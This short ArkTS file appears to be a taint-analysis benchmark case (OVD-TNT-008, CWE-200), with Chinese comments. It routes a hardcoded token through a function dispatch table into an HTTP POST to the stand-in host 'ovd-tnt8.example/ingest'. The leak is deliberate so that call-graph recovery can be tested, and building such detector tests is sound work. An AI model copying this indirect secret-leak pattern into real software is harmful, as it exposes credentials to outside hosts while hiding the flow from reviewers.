// VULN: OVD-TNT-008 污点经函数派发表间接调用（CWE-200）
// sink 以函数引用进数组，调用点为 ldobjbyvalue + 间接 call——sink 名不出现在调用点
// 文本（只在 definefunc 槽位映射），考调用图对一等函数/派发结构的还原能力。
// 孪生 008S 同构派发仅聚合。
import http from '@ohos.net.http';

const TOKEN8 = 'tnt8_tok_ovd_47c2a9';

export function ovdD8Source(): string {
  return TOKEN8;
}

export async function ovdD8SinkA(p: string): Promise<string> {
  return `dispatch-agg:${p.length}`;
}

export async function ovdD8SinkB(p: string): Promise<string> {
  const req: http.HttpRequest = http.createHttp();
  try {
    await req.request('https://ovd-tnt8.example/ingest', {
      method: http.RequestMethod.POST,
      header: { 'x-tnt8-flow': '1' },
      extraData: p
    });
  } catch (e) {
    // graceful：基准端点不可达属预期
  } finally {
    req.destroy();
  }
  return 'tnt8 dispatch-sink posted';
}

export async function ovdTnt008(): Promise<string> {
  const table: Array<(p: string) => Promise<string>> = [ovdD8SinkA, ovdD8SinkB];
  const pick: number = TOKEN8.length > 0 ? 1 : 0;
  await table[pick](ovdD8Source());
  return 'tnt8 dispatch-chain completed';
}
